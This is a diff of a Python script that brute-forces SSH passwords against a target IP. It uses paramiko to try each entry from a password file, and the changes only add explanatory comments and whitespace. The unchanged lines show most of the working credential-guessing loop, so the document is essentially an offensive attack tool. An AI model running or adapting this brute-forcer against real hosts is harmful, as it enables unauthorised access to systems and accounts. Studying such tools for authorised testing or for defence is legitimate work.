@@ -4,20 +4,23 @@ import sys
 import socket
 
 def ssh_brute_force(target_ip, username, password_file):
-    timeout = 200
+    timeout = 200 # connection timeout in seconds
     
     print(f"[*] Starting SSH brute-force on {target_ip}...")
     print()
     
+    # error handling missing file
     try:
         with open (password_file, "r") as file:
             passwords = file.read().splitlines()
     except FileNotFoundError:
         print(f"[!] File '{password_file}' not found")
         sys.exit (1)
-    
+        
+    # error handling connection issues
     for password in passwords:
         password = password.strip()
+        # iterating through collected credentials
         try:
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy ())
@@ -33,5 +36,5 @@ def ssh_brute_force(target_ip, username, password_file):
             print(f"[!] connection error:{str(e)}")
             time.sleep (2)
         finally:
-            ssh. close ()
+            ssh. close () # closing the SSH connection
     print("[*] finished. no valid password found.")
